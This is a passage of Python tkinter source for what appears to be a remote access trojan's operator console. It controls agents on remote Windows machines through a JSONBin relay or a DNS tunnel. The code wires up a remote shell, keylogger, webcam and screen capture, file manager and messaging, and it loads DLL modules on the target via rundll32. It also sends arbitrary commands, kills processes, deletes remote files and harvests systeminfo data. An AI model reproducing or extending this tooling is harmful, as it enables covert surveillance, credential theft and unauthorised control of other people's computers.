                menu.add_command(label="Connect (HTTP)",
                                 command=self.ctx_connect_http)  
                menu.add_command(label="Connect (DNS)",
                                 command=self.on_dns_click)                                 
                menu.post(event.x_root, event.y_root)
                return

            menu.add_command(label="Remote Shell",
                             command=self.ctx_pty if is_dns
                             else self.open_shell_console)

            tools_menu = tk.Menu(
                menu, tearoff=0,
                bg=self.colors["plum_dark"],
                fg=self.colors["spirit_white"],
                activebackground=self.colors["crimson"],
                font=f)
            tools_menu.add_command(label="Screen Monitor",
                                   command=self.open_live_feed)
            tools_menu.add_command(label="Keylogger",
                                   command=self.ctx_keylogger)
            tools_menu.add_command(label="Webcam Feed",
                                   command=self.ctx_camera)
            tools_menu.add_command(label="File Manager",
                                   command=self.ctx_file_manager)
            tools_menu.add_command(label="Messenger",
                                   command=self.ctx_send_message)
            menu.add_cascade(label="Tools", menu=tools_menu)

            menu.add_separator()
            menu.add_command(label="View System Info",
                             command=self.ctx_sysinfo)
            menu.add_separator()

            if is_dns:
                menu.add_command(label="Switch to HTTP",
                                 command=self.jsn_sw)
            else:
                menu.add_command(label="Connect (DNS)",
                                 command=self.on_dns_click)

            menu.add_separator()
            menu.add_command(label="Disconnect Agent",
                             command=self.disconnect_agent)
            menu.add_command(label="Remove from List",
                             command=self.ctx_remove_agent)

        else:
            if is_temp:
                menu.add_command(label="Connect (HTTP)",
                                 command=self.ctx_connect_http)
                menu.add_command(label="Connect (DNS)",
                                 command=self.on_dns_click)
            elif is_dns:
                menu.add_command(label="Connect (DNS)",
                                 command=self.on_dns_click)
                menu.add_separator()
                menu.add_command(label="View System Info",
                                 command=self.ctx_sysinfo)
                menu.add_separator()
                menu.add_command(label="Remove from List",
                                 command=self.ctx_remove_agent)

            elif not session_active:
                menu.add_command(label="Connect (HTTP)",
                                 command=self.ctx_connect_http)
                menu.add_command(label="Connect (DNS)",
                                 command=self.on_dns_click)
                menu.add_separator()
                menu.add_command(label="View System Info",
                                 command=self.ctx_sysinfo)
                menu.add_separator()
                menu.add_command(label="Remove from List",
                                 command=self.ctx_remove_agent)

            else:
                menu.add_command(label="Shell Console",
                                 command=self.open_shell_console)

                tools_menu = tk.Menu(
                    menu, tearoff=0,
                    bg=self.colors["plum_dark"],
                    fg=self.colors["spirit_white"],
                    activebackground=self.colors["crimson"],
                    font=f)
                tools_menu.add_command(label="Screen Monitor",
                                       command=self.open_live_feed)
                tools_menu.add_command(label="Keylogger",
                                       command=self.ctx_keylogger)
                tools_menu.add_command(label="Camera Feed",
                                       command=self.ctx_camera)
                tools_menu.add_command(label="File Manager",
                                       command=self.ctx_file_manager)
                tools_menu.add_command(label="Messenger",
                                       command=self.ctx_send_message)
                menu.add_cascade(label="Tools", menu=tools_menu)

                menu.add_separator()
                menu.add_command(label="View System Info",
                                 command=self.ctx_sysinfo)
                menu.add_separator()
                menu.add_command(label="Connect (DNS)",
                                 command=self.on_dns_click)
                menu.add_separator()
                menu.add_command(label="Remove from List",
                                 command=self.ctx_remove_agent)

        menu.post(event.x_root, event.y_root)

    def ctx_switch_http(self):
        if self.active_mode == "dns":
            self.jsn_sw()
        else:
            self._log_system("Already in HTTP mode")

    def ctx_pty(self):
        self.open_shell_console()

    def ctx_tools(self):
        if not self.selected_agent_data:
            return
        self.tools()

    def ctx_sysinfo(self):
        if not os.path.exists(STATUS_FILE):
            messagebox.showerror(
                "Error", "No audit data available. Run system audit first.")
            return

        with open(STATUS_FILE, 'r', encoding='utf-8') as f:
            info = f.read()

        if hasattr(self, '_sysinfo_window') and self._sysinfo_window.winfo_exists():
            self._sysinfo_window.lift()
            self._sysinfo_window.focus_force()
            return

        win = tk.Toplevel(self.root)
        self._sysinfo_window = win
        win.title("System Information")
        win.geometry("780x560")
        win.configure(bg="#0D0D0D")
        win.resizable(False, False)

        try:
            base_dir = os.environ.get('TAO_BASE_DIR')
            if not base_dir:
                current_file_dir = os.path.dirname(os.path.abspath(__file__))
                base_dir = os.path.abspath(os.path.join(current_file_dir, ".."))
            icon_path = os.path.join(base_dir, "ico", "ico.ico")
            if os.path.exists(icon_path):
                win.wm_iconbitmap(icon_path)
        except Exception:
            pass

        header = tk.Frame(win, bg="#2C1E1E", height=45)
        header.pack(fill="x")
        header.pack_propagate(False)
        device_name = self.selected_agent_data.get('device_name', 'Unknown') \
            if self.selected_agent_data else "Unknown"
        tk.Label(header,
                 text=f"  🖥  System Information — {device_name}",
                 bg="#2C1E1E", fg="#D9A86C",
                 font=("Arial", 12, "bold")).pack(side="left", padx=10, pady=8)

        toolbar = tk.Frame(win, bg="#1A1212", height=32)
        toolbar.pack(fill="x")
        toolbar.pack_propagate(False)

        def copy_all():
            win.clipboard_clear()
            win.clipboard_append(info)
            self._log_m("SYS: System info copied to clipboard")

        tk.Button(toolbar, text="📋 Copy All", command=copy_all,
                  bg="#555555", fg="white", font=("Arial", 8, "bold"),
                  relief="flat", padx=10, pady=2).pack(side="left", padx=6, pady=4)

        text_frame = tk.Frame(win, bg="#0D0D0D")
        text_frame.pack(fill="both", expand=True, padx=8, pady=(4, 0))

        vscroll = tk.Scrollbar(text_frame, orient="vertical")
        hscroll = tk.Scrollbar(text_frame, orient="horizontal")

        text_widget = tk.Text(
            text_frame,
            bg="#0D0D0D", fg="#00FF00",
            font=("Consolas", 9),
            insertbackground="white",
            wrap="none",
            state="normal",
            yscrollcommand=vscroll.set,
            xscrollcommand=hscroll.set,
            relief="flat",
            borderwidth=0,
        )

        vscroll.config(command=text_widget.yview)
        hscroll.config(command=text_widget.xview)

        vscroll.pack(side="right",  fill="y")
        hscroll.pack(side="bottom", fill="x")
        text_widget.pack(side="left", fill="both", expand=True)

        text_widget.tag_configure("header",    foreground="#D9A86C", font=("Consolas", 9, "bold"))
        text_widget.tag_configure("separator", foreground="#444444")
        text_widget.tag_configure("key",       foreground="#5DADE2")

        for line in info.splitlines(keepends=True):
            stripped = line.rstrip("\r\n")
            if stripped.startswith("─"):
                text_widget.insert(tk.END, line, "separator")
            elif stripped in ("SYSTEM INFORMATION", "RAW SYSTEMINFO OUTPUT"):
                text_widget.insert(tk.END, line, "header")
            elif ":" in stripped and not stripped.startswith(" ") \
                    and stripped.split(":")[0].strip() in (
                        "Timestamp", "Device", "IP", "CPU", "GPU", "RAM"):
                key, _, rest = stripped.partition(":")
                text_widget.insert(tk.END, key + ":", "key")
                text_widget.insert(tk.END, rest + "\n")
            else:
                text_widget.insert(tk.END, line)

        text_widget.config(state="disabled")

        tk.Button(win, text="Close", command=win.destroy,
                  bg="#666666", fg="white", font=("Arial", 9),
                  padx=15, pady=3).pack(pady=6)

    def ctx_send_message(self):
        if not self.selected_agent_data:
            return
        self._launch_tool_logic('message')

    def ctx_keylogger(self):
        if not self.selected_agent_data:
            return
        self._launch_tool_logic('keylogger')

    def ctx_camera(self):
        if not self.selected_agent_data:
            return
        self._launch_tool_logic('camera')

    def ctx_file_manager(self):
        if not self.selected_agent_data:
            return
        self._launch_tool_logic('file_manager')

    def open_live_feed(self):
        if not self.selected_agent_data:
            return
        self._launch_tool_logic('live_feed')

    def ctx_remove_agent(self):
        if not self.selected_agent_data:
            return

        agent_name         = self.selected_agent_data['device_name']
        current_session_id = ActiveSession.get()
        selected_id        = (
            f"{self.selected_agent_data.get('device_name', '')}_"
            f"{self.selected_agent_data.get('device_ip', '')}")
        is_connected = (current_session_id
                        and current_session_id == selected_id)

        if is_connected:
            if messagebox.askyesno(
                "Confirm Removal & Cleanup",
                f"Are you sure you want to remove {agent_name}?\n\n"
                "This will perform the following actions:\n"
                "1. Delete remote settings (settings.json)\n"
                "2. CLEAR all commands in your JSONBin storage\n"
                "3. Switch the agent back to HTTP Polling mode\n"
                "4. Remove the agent from this registry."
            ):
                if self._acquire_op_lock():
                    Thread(
                        target=self._perform_agent_removal_sequence,
                        daemon=True).start()
        else:
            if messagebox.askyesno(
                "Remove Agent",
                f"Remove '{agent_name}' from the registry?\n\n"
                "The agent will not be notified."
            ):
                self._remove_agent_from_file(self.selected_agent_data)
                self.temp_http_agent     = None
                self.selected_agent_data = None
                self.refresh_treeview()
                self._log_system(f"'{agent_name}' removed from registry.")

    def _perform_agent_removal_sequence(self):
        agent_data = self.selected_agent_data
        if self.active_mode == "dns":
            self._perform_agent_removal_dns(agent_data)
        else:
            self._perform_agent_removal_http(agent_data)

    def _perform_agent_removal_dns(self, agent_data):
        try:
            self._log_system(
                "Cleanup [1/5]: Requesting deletion of settings.json...")
            if self.dns_mode.dns_cmd("del modules\\main\\settings.json"):
                time.sleep(5)
                self._log_system(
                    "Cleanup: settings.json deletion command sent.")
            else:
                self._log_system(
                    "Cleanup Error: Failed to send delete command.")
                self.root.after(0, self._release_op_lock)
                return

            self._log_system("Cleanup [2/5]: Clearing JSONBin storage...")
            self.cls_json()
            time.sleep(2)

            self._log_system(
                "Cleanup [3/5]: Notifying agent to switch to HTTP mode...")
            if self.dns_mode.dns_cmd("-mode jsonbin"):
                time.sleep(3)
            else:
                self._log_system(
                    "Cleanup Error: Failed to send switch command.")
                self.root.after(0, self._release_op_lock)
                return

            self._log_system(
                "Cleanup [4/5]: Deleting agent from local database...")
            self._remove_agent_from_file(agent_data)

            self._log_system(
                "Cleanup [5/5]: Switching controller to HTTP mode...")
            if self.dns_mode:
                self.dns_mode.srvr_stp()
            self.update_active_mode("http")
            ActiveSession.set(None)
            self.selected_agent_data = None
            self.mode_switching = False
            self.root.after(0, lambda: self._set_controller_state("polling"))
            self.root.after(0, self.refresh_treeview)
            self.root.after(0, lambda: self._log_system(
                f"SUCCESS: {agent_data['device_name']} fully removed. "
                "Controller switched to HTTP mode."))
            self.root.after(0, self._release_op_lock)
        except Exception as e:
            self.root.after(
                0, lambda: self._log_system(
                    f"Error during DNS removal: {e}"))
            self.root.after(0, self._release_op_lock)

    def _perform_agent_removal_http(self, agent_data):
        try:
            self._log_system(
                "Cleanup [1/5]: Sending settings.json deletion via HTTP...")
            if not self._send_http_cmd("cmd--reload-config"):
                self._log_system(
                    "Cleanup Error: Failed to send delete command via HTTP.")
                self.root.after(0, self._release_op_lock)
                return

            self._log_system(
                "Cleanup: Waiting for agent to process deletion (5s)...")
            time.sleep(5)

            self._log_system("Cleanup [2/5]: Clearing JSONBin storage...")
            self.cls_json()
            time.sleep(2)

            self._log_system(
                "Cleanup [3/5]: Sending mode-switch command "
                "(revert to HTTP polling)...")
            self._log_system(
                "Cleanup: Waiting for agent to switch modes (3s)...")
            time.sleep(3)

            self._log_system(
                "Cleanup [4/5]: Clearing JSONBin one final time...")
            self.cls_json()
            time.sleep(1)

            self._log_system(
                "Cleanup [5/5]: Deleting agent from local database...")
            self._remove_agent_from_file(agent_data)

            self.selected_agent_data = None
            self.root.after(0, self.refresh_treeview)
            self.root.after(0, lambda: self._log_system(
                f"SUCCESS: {agent_data['device_name']} fully removed. "
                "Agent reverted to HTTP polling mode."))
            self.root.after(0, self._release_op_lock)
        except Exception as e:
            self.root.after(
                0, lambda: self._log_system(
                    f"Error during HTTP removal: {e}"))
            self.root.after(0, self._release_op_lock)

    def _remove_agent_from_file(self, agent_data):
        agents  = self.load_agents()
        updated = [
            a for a in agents
            if not (a.get('device_name') == agent_data['device_name']
                    and a.get('device_ip') == agent_data['device_ip'])
        ]
        with open(AGENTS_FILE, 'w') as f:
            json.dump(updated, f, indent=4)
        self._log_system(
            f"✓ {agent_data['device_name']} deleted from agents.json")


    def _launch_tool_logic(self, tool_type):
        if not self.selected_agent_data:
            self._log_m("ERROR: No agent selected")
            return

        if self.active_mode != "dns":
            agent_ip = self.selected_agent_data.get('device_ip')
            if not agent_ip:
                self._log_m(
                    "ERROR: Could not resolve agent IP from saved data")
                return

            self._log_m(f"SYS: Launching '{tool_type}' via HTTP Mode...")

            fmgr_tools     = ['file_manager', 'message']
            monitor2_tools = ['live_feed', 'keylogger', 'camera']

            existing_video_client = None
            for t in monitor2_tools:
                tw = self.active_tool_windows.get(t)
                if (tw and hasattr(tw, 'video_client')
                        and tw.video_client
                        and getattr(tw.video_client, 'session_active', False)):
                    existing_video_client = tw.video_client
                    break

            if tool_type in fmgr_tools:
                if not getattr(self, 'fmgr_loaded', False):
                    if getattr(self, 'fmgr_loading', False):
                        self.root.after(
                            1000,
                            lambda: self._launch_tool_logic(tool_type))
                        return
                    self.fmgr_loading = True
                    self._finish_fmgr_load(tool_type, agent_ip, None)
                else:
                    self._open_tool_window(tool_type, agent_ip, None)

            elif tool_type in monitor2_tools:
                if not self.monitor2_loaded:
                    if self.monitor2_loading:
                        self.root.after(
                            1000,
                            lambda: self._launch_tool_logic(tool_type))
                        return
                    self.monitor2_loading = True
                    self._finish_dll_load(
                        tool_type, agent_ip, existing_video_client)
                else:
                    self._open_tool_window(
                        tool_type, agent_ip, existing_video_client)
            return

        if not self.dns_mode.current_agent_id:
            self._log_m(
                "ERROR: Agent has not checked into TUNNEL yet. Retrying...")
            self.root.after(
                2000, lambda: self._launch_tool_logic(tool_type))
            return

        agent_info = self.dns_mode.dns_server.agents.get(
            self.dns_mode.current_agent_id)
        if not agent_info or not agent_info.get('ip'):
            self._log_m(
                "ERROR: Could not resolve Agent IP. Ensure Mode 2 is active.")
            return

        agent_ip       = agent_info.get('ip')
        fmgr_tools     = ['file_manager', 'message']
        monitor2_tools = ['live_feed', 'keylogger', 'camera']

        is_fmgr_tool = tool_type in fmgr_tools

        existing_video_client = None
        for t in monitor2_tools:
            tw = self.active_tool_windows.get(t)
            if (tw and hasattr(tw, 'video_client')
                    and tw.video_client.session_active):
                existing_video_client = tw.video_client
                break

        if ((is_fmgr_tool and getattr(self, 'fmgr_loaded', False))
                or (tool_type in monitor2_tools and self.monitor2_loaded)):
            self._log_m(f"Module already active, launching {tool_type}...")
            self._open_tool_window(tool_type, agent_ip, existing_video_client)
            return

        if self.monitor2_loading or getattr(self, 'fmgr_loading', False):
            self.root.after(
                1000, lambda: self._launch_tool_logic(tool_type))
            return

        if is_fmgr_tool:
            self.fmgr_loading = True
            self._log_m("SYS: Clearing JSONBin before exec-fmgr.dll...")
            self.cls_json()
            time.sleep(0.5)
            if self.dns_mode.dns_cmd("exec-fmgr.dll"):
                self.root.after(
                    3000,
                    lambda: self._finish_fmgr_load(
                        tool_type, agent_ip, existing_video_client))
            else:
                self._log_m("ERROR: Failed to send exec-fmgr.dll command")
                self.fmgr_loading = False
        else:
            self.monitor2_loading = True
            self._log_m("SYS: Clearing JSONBin before exec-monitor.dll...")
            self.cls_json()
            time.sleep(0.5)
            if self.dns_mode.dns_cmd("exec-monitor.dll"):
                self.root.after(
                    3000,
                    lambda: self._finish_dll_load(
                        tool_type, agent_ip, existing_video_client))
            else:
                self._log_m("ERROR: Failed to send exec-monitor.dll command")
                self.monitor2_loading = False

    def _send_taskkill(self, dll_name: str) -> bool:
        dll_tool_map = {
            "monitor.dll": ['live_feed', 'keylogger', 'camera'],
            "fmgr.dll":    ['file_manager', 'message'],
        }
        dependent_tools = dll_tool_map.get(dll_name, [])
        still_open = [
            t for t in dependent_tools
            if self.active_tool_windows.get(t) is not None
        ]
        if still_open:
            self._log_m(
                f"TASKKILL: Skipped {dll_name} — tools still open: "
                f"{still_open}")
            return False

        cmd = "taskkill /f /im rundll32.exe"
        if self.active_mode == "dns":
            try:
                return bool(self.dns_mode.dns_cmd(cmd))
            except Exception as e:
                self._log_m(f"ERROR sending taskkill via DNS: {e}")
                return False
        else:
            return self._send_http_cmd(cmd)

    def _send_http_cmd(self, cmd):
        url     = self.url_entry.get().strip()
        api_key = self.api_key_entry.get().strip()
        if not url or not api_key:
            self._log_m(
                "ERROR: Missing HTTP credentials for command send")
            return False

        target_id = ActiveSession.get()
        if not target_id:
            self._log_m(
                "ERROR: No active HTTP session — connect an agent first")
            return False

        try:
            headers     = {
                "X-Master-Key": api_key,
                "Content-Type": "application/json",
            }
            payload_cmd = cmd if cmd.startswith("cmd-") else f"cmd-{cmd}"
            raw_cmd     = cmd.lstrip("cmd-")

            if raw_cmd.startswith("exec-"):
                self._log_m(
                    f"SYS: Clearing JSONBin before exec command "
                    f"({raw_cmd})...")
                try:
                    self.session.put(
                        url,
                        json={"cmd": "None", "cmd_result": "",
                              "target_id": target_id},
                        headers=headers, timeout=3)
                    time.sleep(0.5)
                except Exception as ce:
                    self._log_m(f"SYS WARN: pre-exec clear failed: {ce}")

            resp = self.session.put(
                url,
                json={"cmd": payload_cmd, "target_id": target_id},
                headers=headers, timeout=5)
            if resp.status_code == 200:
                self._log_m(f"SYS: HTTP cmd sent: {cmd}")
                return True
            else:
                self._log_m(f"ERROR: HTTP cmd failed ({resp.status_code})")
                return False
        except Exception as e:
            self._log_m(f"ERROR sending HTTP cmd: {e}")
            return False

    def _finish_fmgr_load(self, tool_type, agent_ip, existing_client):
        self.fmgr_loaded  = True
        self.fmgr_loading = False
        self._log_m("Opening File Manager window...")
        self._open_tool_window(tool_type, agent_ip, existing_client)

    def _finish_dll_load(self, tool_type, agent_ip, existing_client):
        self.monitor2_loaded  = True
        self.monitor2_loading = False
        self._log_m("Opening tool window...")
        self._open_tool_window(tool_type, agent_ip, existing_client)

    def _open_tool_window(self, tool_type, agent_ip, existing_client=None):
        if tool_type == 'live_feed':
            if self.active_tool_windows['live_feed']:
                self.active_tool_windows['live_feed'].window.lift()
                self._log_m("Live feed already open")
                return
            self._log_m("Opening Live Feed window...")
            self.active_tool_windows['live_feed'] = LiveFeedWindow(
                self.root, self, agent_ip,
                video_client=existing_client)

        elif tool_type == 'keylogger':
            if self.active_tool_windows['keylogger']:
                self.active_tool_windows['keylogger'].window.lift()
                self._log_m("Keylogger already open")
                return
            self._log_m("Opening Keylogger window...")
            self.active_tool_windows['keylogger'] = KeyloggerWindow(
                self.root, self, agent_ip,
                video_client=existing_client)

        elif tool_type == 'camera':
            if self.active_tool_windows['camera']:
                self.active_tool_windows['camera'].window.lift()
                self._log_m("Camera already open")
                return
            self._log_m("Opening Camera window...")
            self.active_tool_windows['camera'] = CameraWindow(
                self.root, self, agent_ip,
                video_client=existing_client)

        elif tool_type == 'file_manager':
            if self.active_tool_windows['file_manager']:
                self.active_tool_windows['file_manager'].window.lift()
                self._log_m("File Manager already open")
                return
            self._log_m("Opening File Manager window...")
            self.active_tool_windows['file_manager'] = FileManagerWindow(
                self.root, self, agent_ip)

        elif tool_type == 'message':
            if self.active_tool_windows['message']:
                self.active_tool_windows['message'].window.lift()
                self._log_m("Message dialog already open")
                return
            self._log_m("Opening Message dialog...")
            self.active_tool_windows['message'] = MessageDialogWindow(
                self.root, self)

    def _open_tcp_window(self, agent_ip):
        self._log_m(
            f"Opening live feed window (connecting to {agent_ip}:443)...")
        if self.live_feed_window:
            try:
                self.live_feed_window.window.destroy()
            except Exception:
                pass
        self.live_feed_window = LiveFeedWindow(self.root, self, agent_ip)


    def verify_dll_loaded(self):
        if self.active_mode != "dns":
            self._log_m("ERROR: Must be in TUNNEL mode")
            return False
        if not self.dns_mode.current_agent_id:
            self._log_m("ERROR: No agent connected")
            return False
        self._log_m("Verifying DLL is loaded...")
        agent_info = self.dns_mode.dns_server.agents.get(
            self.dns_mode.current_agent_id)
        if not agent_info:
            self._log_m("ERROR: Could not get agent info")
            return False
        agent_ip  = agent_info.get('ip')
        test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        test_sock.settimeout(3)
        try:
            result = test_sock.connect_ex((agent_ip, 443))
            test_sock.close()
            if result == 0:
                self._log_m("✓ DLL is loaded (port 443 open)")
                return True
            else:
                self._log_m(
                    f"✗ DLL not loaded (port 443 closed, error: {result})")
                return False
        except Exception as e:
            self._log_m(f"ERROR: Port test failed: {e}")
            return False

    def has_valid_dns_credentials(self, agent_data):
        if not agent_data:
            return False
        domain = agent_data.get('dns_domain', '').strip()
        port   = agent_data.get('dns_port',   '').strip()
        key    = agent_data.get('dns_encryption_key', '').strip()
        return bool(domain and port and key)

    def res_p_mode(self):
        if self.active_mode == "dns":
            self._log_m("AUTO-RESTORING PREVIOUS MODE: TUNNEL")
            self.sw_dns()
        else:
            self._log_m("Starting in JSONBin mode (default)")
            self.upmdui()

    def open_agent_selector(self):
        if (hasattr(self, 'selector_window')
                and self.selector_window.window.winfo_exists()):
            self.selector_window.window.lift()
            self._log_m("SYS: Agent Selector is already open.")
            return
        if self.active_mode not in ("dns", ""):
            self._log_m(
                f"SYS: Must be in tunnel mode to select agents "
                f"(Current: {self.active_mode})")
            return
        self._log_m("Opening Agent Selector...")
        self.selector_window = AgentSelectorWindow(self.root, self)

    def refresh_all_modes(self):
        if self.active_mode == "http":
            self._log_system("Refreshing agents...")
            Thread(target=self.poll_http_agents_dashboard, daemon=True).start()
        elif self.active_mode == "dns":
            self._log_system("Refreshing agents...")
            if (self.dns_mode.dns_server
                    and self.dns_mode.dns_server.running):
                agents = self.dns_mode.dns_server.list_agent()
                if agents:
                    self._log_system(
                        f"SYS: Found {len(agents)} DNS agent(s)")
                    for a in agents:
                        self._log_system(
                            f"  - {a['id']} ({a['ip']})")
                else:
                    self._log_system("SYS: No agents currently connected")
            else:
                self._log_system("SYS: Server not running")
        else:
            self._log_system("SYS: Unknown mode - cannot refresh")

    def internal_cmd(self, cmd):
        if cmd == "-mode dns":
            self.sw_dns()
        elif cmd == "-mode jsonbin":
            self.jsn_sw()

    def open_settings(self):
        if (hasattr(self, 'settings_window')
                and self.settings_window.window.winfo_exists()):
            self.settings_window.window.lift()
            return
        from ui.controller_settings import ControllerSettingsWindow
        self.settings_window = ControllerSettingsWindow(self.root, self)
        self._log_system("Settings window opened")

    def cls_json(self):
        try:
            url     = self.url_entry.get().strip()
            api_key = self.api_key_entry.get().strip()
            headers = {
                "X-Master-Key": api_key,
                "Content-Type": "application/json",
            }
            self.session.put(
                url,
                json={"cmd": "None", "cmd_result": "",
                      "device_status": "active"},
                headers=headers, timeout=3)
            self._log_m("SYS: JSONBin cleared")
        except Exception:
            pass

    def send_cmd(self):
        cmd = self.cmd_entry.get().strip()
        if not cmd:
            return
        self.cmd_entry.delete(0, tk.END)

        if cmd.lower() == "reset-agents":
            if self.reset_agents_file():
                self._log_m(
                    "SYS: Agent registry reset. "
                    "Use Refresh to discover new agents.")
            return
        if cmd.lower() in ("cls", "clear"):
            if not self.in_interactive_session:
                self._cc()
                return
        if cmd.lower() == "-mode dns":
            self.sw_dns()
            return
        if cmd.lower() == "-mode jsonbin":
            self.jsn_sw()
            return
        if cmd.lower() == "-reverse_dns":
            self.dns_mode.send_reverse_dns_cmd()
            return

        if self.in_interactive_session and cmd.lower() in ("exit", "quit"):
            mode_prefix = "[DNS]" if self.active_mode == "dns" else "[HTTP]"
            self._log_m(f"{mode_prefix} $ {cmd}")
            self._log_m("Exiting interactive session...")
        elif self.in_interactive_session:
            self._log_m(f"> {cmd}")
        else:
            mode_prefix = "[DNS]" if self.active_mode == "dns" else "[HTTP]"
            self._log_m(f"{mode_prefix} $ {cmd}")

        if self.mode_switching:
            self._log_m(
                "SYS: Cannot send command while mode switch in progress")
            if hasattr(self, '_mode_switch_start_time'):
                if time.time() - self._mode_switch_start_time > 30:
                    self._log_m(
                        "SYS: Mode switch timeout detected - resetting flag")
                    self.mode_switching = False
                else:
                    return
            else:
                return

        if self.active_mode == "dns":
            if self.dns_mode.dns_cmd(cmd):
                self.awaiting_command_result = True
            else:
                self._log_m("ERROR: Failed to send command")
        else:
            self.awaiting_command_result = True
            url     = self.url_entry.get().strip()
            api_key = self.api_key_entry.get().strip()
            Thread(target=self.requests,
                   args=(url, api_key, cmd), daemon=True).start()

    def requests(self, url, api_key, cmd):
        self.last_cmd_result_displayed = ""
        try:
            headers      = {
                "X-Master-Key": api_key,
                "Content-Type": "application/json",
            }
            payload_cmd  = cmd if cmd.startswith("cmd-") else f"cmd-{cmd}"
            target_id    = ActiveSession.get()

            if target_id is None:
                self.update_queue.put((
                    "error",
                    "No active agent — use 'Connect HTTP' first"))
                return

            resp = self.session.put(
                url,
                json={"cmd": payload_cmd, "target_id": target_id},
                headers=headers, timeout=5)
            if resp.status_code == 200:
                self.root.after(2000, lambda: self._poll(url, api_key))
            else:
                self.update_queue.put((
                    "error", f"Request failed: {resp.status_code}"))
        except Exception as e:
            self.update_queue.put(("error", str(e)))

    def _poll(self, url, api_key):
        if not self.awaiting_command_result:
            return
        if self.active_mode not in ("jsonbin", "http"):
            return
        Thread(target=self._gcmd, args=(url, api_key), daemon=True).start()

    def _gcmd(self, url, api_key):
        try:
            headers  = {"X-Master-Key": api_key}
            response = self.session.get(url, headers=headers, timeout=3)
            if response.status_code == 200:
                data          = self._gr(response.json())
                cmd_result    = data.get("cmd_result",    "")
                active_id     = ActiveSession.get()
                responding_id = data.get("responding_id", "")

                if (responding_id and active_id
                        and responding_id != active_id):
                    self._log_m(
                        f"SYS: Ignored stray result from '{responding_id}' "
                        f"(connected to '{active_id}')")
                    if self.awaiting_command_result:
                        self.root.after(
                            1500, lambda: self._poll(url, api_key))
                    return

                if cmd_result == "executing...":
                    if self.awaiting_command_result:
                        self.root.after(
                            1000, lambda: self._poll(url, api_key))
                    return

                if (cmd_result and cmd_result.strip()
                        and cmd_result != "None"):
                    self.last_cmd_result_displayed = cmd_result
                    self.update_queue.put(("command_result", cmd_result))
                    return

                if self.awaiting_command_result:
                    self.root.after(
                        1500, lambda: self._poll(url, api_key))
        except Exception:
            if self.awaiting_command_result:
                self.root.after(1500, lambda: self._poll(url, api_key))

    def updateszwei(self):
        try:
            while True:
                u_type, data = self.update_queue.get_nowait()

                if u_type == "command_result":
                    if data == "CLR_Remote Shell":
                        if self.shell_console:
                            self.shell_console.clear_console()
                    elif data and data.strip():
                        self.h_m_r(data)
                    self.awaiting_command_result = False

                elif u_type == "dns_result":
                    if data and data.strip():
                        self.h_m_r(data)
                    self.awaiting_command_result = False

                elif u_type == "system_info_silent":
                    self.upst(data)

                elif u_type == "error":
                    self._log_m(f"ERROR: {data}")
                    self.awaiting_command_result = False

                elif u_type == "mode_switch_confirmed":
                    self.accepted()

                elif u_type == "mode_switch_timeout":
                    self._log_m(
                        "SYS: Proceeding with mode switch despite timeout...")
                    self.accepted()

        except queue.Empty:
            pass
        self.root.after(200, self.updateszwei)

    def h_m_r(self, data):
        is_starting_interactive = any(
            data.strip().lower().startswith(
                f"session started: {cmd}")
            for cmd in self.interactive_commands)

        is_interactive_output = (
            self.in_interactive_session
            and not any(m in data for m in [
                "--- SESSION CLOSED: Returning to standard logs ---",
                "Session started:",
                "Failed to start",
            ]))

        is_exiting_interactive = (
            "--- SESSION CLOSED: Returning to standard logs ---" in data)

        if is_starting_interactive:
            for cmd in self.interactive_commands:
                if f"session started: {cmd}" in data.lower():
                    self.interactive_session_name = cmd
                    break
            self.in_interactive_session = True
            if hasattr(self, 'shell_console') and self.shell_console:
                self.shell_console.clear_console()
            else:
                self._cc()
            self._log_m(
                f"INTERACTIVE SESSION: "
                f"{self.interactive_session_name.upper()}")
            self._log_m("Session started. Type 'exit' to return to normal mode.")
            self.upstats(
                f"Interactive: {self.interactive_session_name.upper()}", "blue")
            if not data.strip().lower().endswith(
                    f"session started: {self.interactive_session_name}"):
                for line in data.split('\n'):
                    if (not line.strip().lower().startswith("session started:")
                            and line.strip()):
                        self._log_m(line)
            return

        if is_exiting_interactive:
            self.in_interactive_session   = False
            self.interactive_session_name = None
            self._log_m("")
            self._log_m("SYS: Interactive session closed")
            self._log_m("Returned to standard command mode")
            self._log_m("")
            self.upstats("Connected", "green")
            return

        if is_interactive_output:
            for line in data.split('\n'):
                self._log_m(line)
            return

        self._log_m(data)

    def ec(self):
        url     = self.url_entry.get().strip()
        api_key = self.api_key_entry.get().strip()
        if not url or not api_key:
            self.upstats("Missing credentials", "red")
            return
        self.upstats("Connecting...", "gold")
        Thread(target=self.poll_http_agents, daemon=True).start()
        Thread(target=self._rsi, args=(url, api_key), daemon=True).start()

    def _rsi(self, url, api_key):
        try:
            headers = {
                "X-Master-Key": api_key,
                "Content-Type": "application/json",
            }
            self._log_m("Requesting System Audit...")
            full_cmd = (
                "cmd-systeminfo && "
                "wmic path win32_VideoController get name")
            self.session.put(
                url,
                json={"cmd": full_cmd},
                headers=headers, timeout=5)

            for _ in range(25):
                time.sleep(2)
                resp = self.session.get(url, headers=headers, timeout=5)
                if resp.status_code == 200:
                    record     = self._gr(resp.json())
                    cmd_result = record.get("cmd_result", "")
                    if "Host Name:" in cmd_result:
                        self._log_m("SYS: Audit Data Received")
                        self.p_audit(cmd_result)
                        ui_data = self.ui_prep()
                        self.session.put(
                            url,
                            json={"cmd": "None", "cmd_result": ""},
                            headers=headers)
                        self.update_queue.put(
                            ("system_info_silent", ui_data))
                        return

            self.update_queue.put(
                ("connection_failed", "Audit Timeout"))
        except Exception as e:
            self._log_m(f"Audit Error: {e}")

    def p_audit(self, output):
        full_info = {
            "device": "Unknown",
            "ip":     "N/A",
            "cpu":    "Unknown",
            "gpu":    "Unknown",
            "ram":    "Unknown",
        }
        try:
            hn = re.search(r"Host Name:\s+(.*)", output)
            if hn:
                full_info["device"] = hn.group(1).strip()

            cpu = re.search(r"\[01\]:\s+(.*)", output)
            if cpu:
                full_info["cpu"] = cpu.group(1).strip()

            ram = re.search(
                r"Total Physical Memory:\s+([\d,]+)\s+MB", output)
            if ram:
                raw_ram = ram.group(1).replace(",", "")
                full_info["ram"] = (
                    f"{round(int(raw_ram) / 1024, 1)} GB")

            ips = re.findall(
                r"IP address\(es\)\s+\[\d+\]:\s+(\d+\.\d+\.\d+\.\d+)",
                output)
            if ips:
                full_info["ip"] = ips[0]

            gpu = re.search(r"Name\s*\n(?!Name)(.*)", output)
            if gpu:
                full_info["gpu"] = gpu.group(1).strip()

            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            with open(STATUS_FILE, 'w', encoding='utf-8') as f:
